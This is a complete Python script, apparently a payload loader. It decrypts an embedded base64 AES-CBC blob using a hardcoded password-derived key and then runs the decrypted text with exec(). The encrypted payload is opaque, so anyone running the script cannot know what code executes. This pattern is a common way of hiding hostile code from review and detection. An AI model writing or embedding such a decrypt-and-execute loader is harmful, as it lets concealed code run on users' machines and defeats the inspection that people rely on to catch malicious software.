import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
import tempfile
import subprocess

# Constant key (same as encoder)
PASSWORD = "tiqny2q2je"
KEY = hashlib.md5(PASSWORD.encode()).digest()  # 16-byte AES-128 key

# Base64-encoded encrypted data (replace with your actual Base64 string)
ENCRYPTED_BASE64 = """DSOgLs+aSp4FXRMMyOKeByOeMNi/IcmGZmxD6MAK9ciM9RP+TNfD0AN+bqZ0oGiZKhp5a7T5TgWgri5ed/MUKuh10toUu5wrAJtaehrRNzQVK/mkoMifFpfGixPaZMXUHogaDi+83ExAiEwg0O6fPXj7NI03//kpYs+XM577q9FWq1yihFAh2/1DmBEfAYFB3zxjvm2VdrbfPoDDoTpY6kzxLxVXaddPWDXHDkRfHrJpocB9tNxrUVowaUoakX85TXBE7hrnkYjBkvGUXA4BRVRQDBMVlk6FuoAOZYile2ITDK+gG31nwZRDGA7/EWk60sqSDgJcXrwGwaa25VgMYK5treBwRRcy+gh1pZA6GxLJj0aen+xjYNdRBq8YoHIjvV6HcdU5RX6gmCTk0q4lODc11F2rgjPdwFDno74w9zviQGvRkkclf2VoIXQ4pggSl4bwnO7VdA7LnOFi8Xqk746C8xEgtXHIeMgCXbdI35ns8y5ae3ufEi8ocezIoB0w89b+SuJefp/pYq1o79GKak/etTbfO3hwndM3hS2fC0+qH0UodnvyYVLzibyvCrFTYjbmCfBYFLibijJKDGzK0QxEuvjC5bjtv1IjI5zfNOLTeHsnt0H+h3PlbWxjsG2r4j9yZurBoJMJdOdO0blLneqVHeJ2NfCYj7bc73E63oLoPJozHakSYfS76f29s5JKwNUg2exmz2qhu/GeL2QRKHkXZqSDG+fmeqcg3CH8DoKnydMX/paqVZ8g+NOKd4CnDoBSY9nPJmoYSOhwLiPNopndPX/Wb1pH1eHlLLXNCBkc1ovcmjqSPf1r3ZV7sr9zK/Ui7thJAECi2CeW7KgAexJ8jL0yGjXhUIuGg4RbBWtp1ojU4k6qB3UztXcIOrDM4ciiWgKkqqrkibVZtkVjmsB1CqA7ldOu36l9aWrRYz8gK7ZkRCKGrUbDOT6DWOOIGYcB9xF2YeHZGRHgBng+5/eAcqho4383cjFeMql50F0="""

def decrypt_and_execute():
    try:
        # Decode Base64 to get IV + ciphertext
        data = base64.b64decode(ENCRYPTED_BASE64.strip())
        
        # Extract IV (first 16 bytes) and ciphertext (rest)
        iv = data[:16]
        ciphertext = data[16:]
        
        # Decrypt
        cipher = AES.new(KEY, AES.MODE_CBC, iv)
        decrypted_code = unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')
        
        print("[+] Decrypted code successfully. Executing...")
        
        # Option 1: Direct execution (dangerous if code is untrusted)
        exec(decrypted_code)
        
        
        return True
    
    except Exception as e:
        print(f"[!] Failed: {e}")
        return False

if __name__ == "__main__":
    decrypt_and_execute()  # No file input needed